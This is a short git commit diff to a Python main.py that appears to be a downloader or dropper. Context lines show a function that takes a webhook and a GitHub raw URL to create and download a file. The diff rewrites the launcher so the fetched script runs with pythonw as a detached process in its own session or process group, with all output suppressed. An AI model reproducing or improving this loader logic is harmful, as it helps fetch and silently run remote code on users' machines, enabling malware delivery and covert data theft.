f1b34ceaae259d7ba416f66012b458f0cac61867
erwandemoin <erwandemoin@gmail.com>
2025-04-19 12:40:36 +0200

    Update main.py

--- main.py
+++ main.py
@@ -21,17 +21,36 @@ def CreateFandDownloadIT(Webhooook, githubraw):
 
 def StartProg(FilePath):
     try:
-        process = subprocess.Popen(
-            ["pythonw", FilePath], 
-            stdout=subprocess.DEVNULL, 
-            stderr=subprocess.DEVNULL
-        )
-        process.communicate() 
+
+        if os.name == 'nt':  # Windows
+
+            DETACHED_PROCESS = 0x00000008
+            CREATE_NEW_PROCESS_GROUP = 0x00000200
+
+            flags = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP
+            
+            subprocess.Popen(
+                ["pythonw", FilePath],
+                creationflags=flags,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                shell=False,
+                close_fds=True
+            )
+        else:
+            # Double fork pour Unix
+            subprocess.Popen(
+                ["pythonw", FilePath],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                start_new_session=True,
+                close_fds=True
+            )
+        
     except Exception as e:
-        print(f"Error during execution: {e}")
+        print(f"{e}")
 
 def main():
-    
     CreateFandDownloadIT(Webhooook, githubraw)
     StartProg(FilePath)
 
